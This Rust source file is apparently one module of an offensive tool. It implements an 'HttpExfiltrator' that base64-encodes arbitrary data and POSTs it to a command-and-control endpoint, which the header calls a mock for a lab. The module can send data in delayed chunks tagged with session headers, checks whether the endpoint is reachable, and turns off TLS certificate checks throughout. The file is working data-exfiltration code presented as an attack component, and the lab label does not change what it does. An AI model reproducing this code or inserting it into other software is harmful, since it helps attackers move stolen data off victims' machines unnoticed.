//! HTTP Exfiltration
//!
//! Sends data via HTTP to C2 server (mock for lab).

use super::{ExfilError, Exfiltrator};

#[allow(dead_code)]
pub struct HttpExfiltrator {
    /// URL do endpoint
    endpoint: String,
    
    /// Client HTTP
    client: reqwest::Client,
}

#[allow(dead_code)]
impl HttpExfiltrator {
    pub fn new(endpoint: &str) -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .danger_accept_invalid_certs(true) // Apenas para lab!
            .build()
            .expect("Falha ao criar cliente HTTP");
        
        Self {
            endpoint: endpoint.to_string(),
            client,
        }
    }
    
    /// Envia dados de forma assíncrona
    pub async fn send_async(&self, data: &[u8]) -> Result<(), ExfilError> {
        // Codificar em base64
        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
        
        // Enviar via POST
        let response = self.client
            .post(&self.endpoint)
            .header("Content-Type", "application/octet-stream")
            .header("X-Session-ID", uuid::Uuid::new_v4().to_string())
            .body(encoded)
            .send()
            .await
            .map_err(|e| ExfilError::HttpError(e.to_string()))?;
        
        if !response.status().is_success() {
            return Err(ExfilError::HttpError(
                format!("Status: {}", response.status())
            ));
        }
        
        tracing::info!("Dados enviados para {}", self.endpoint);
        
        Ok(())
    }
    
    /// Envia dados em chunks menores
    pub async fn send_chunked(&self, data: &[u8], chunk_size: usize) -> Result<(), ExfilError> {
        use base64::Engine;
        
        let total_chunks = (data.len() + chunk_size - 1) / chunk_size;
        let session_id = uuid::Uuid::new_v4().to_string();
        
        for (i, chunk) in data.chunks(chunk_size).enumerate() {
            let encoded = base64::engine::general_purpose::STANDARD.encode(chunk);
            
            self.client
                .post(&self.endpoint)
                .header("Content-Type", "application/octet-stream")
                .header("X-Session-ID", &session_id)
                .header("X-Chunk-Index", i.to_string())
                .header("X-Total-Chunks", total_chunks.to_string())
                .body(encoded)
                .send()
                .await
                .map_err(|e| ExfilError::HttpError(e.to_string()))?;
            
            // Delay entre chunks
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        
        Ok(())
    }
}

impl HttpExfiltrator {
    /// Verifica conexão de forma assíncrona
    pub async fn check_connection_async(&self) -> bool {
        self.client
            .head(&self.endpoint)
            .timeout(std::time::Duration::from_secs(5))
            .send()
            .await
            .is_ok()
    }
}

impl Exfiltrator for HttpExfiltrator {
    fn send(&self, data: &[u8]) -> Result<(), ExfilError> {
        // Esta versão é para uso fora de contexto async
        // Em contexto async, use send_async() diretamente
        use base64::Engine;
        
        let encoded = base64::engine::general_purpose::STANDARD.encode(data);
        let endpoint = self.endpoint.clone();
        
        // Criar client novo (blocking)
        let client: reqwest::blocking::Client = reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e: reqwest::Error| ExfilError::SendFailed(e.to_string()))?;
        
        let response = client
            .post(&endpoint)
            .header("Content-Type", "application/octet-stream")
            .header("X-Session-ID", uuid::Uuid::new_v4().to_string())
            .body(encoded)
            .send()
            .map_err(|e: reqwest::Error| ExfilError::HttpError(e.to_string()))?;
        
        if !response.status().is_success() {
            return Err(ExfilError::HttpError(
                format!("Status: {}", response.status())
            ));
        }
        
        Ok(())
    }
    
    fn check_connection(&self) -> bool {
        // Versão síncrona com blocking client
        let client: reqwest::blocking::Client = match reqwest::blocking::Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .danger_accept_invalid_certs(true)
            .build() 
        {
            Ok(c) => c,
            Err(_) => return false,
        };
        
        client
            .head(&self.endpoint)
            .send()
            .is_ok()
    }
    
    fn name(&self) -> &str {
        "http"
    }
}

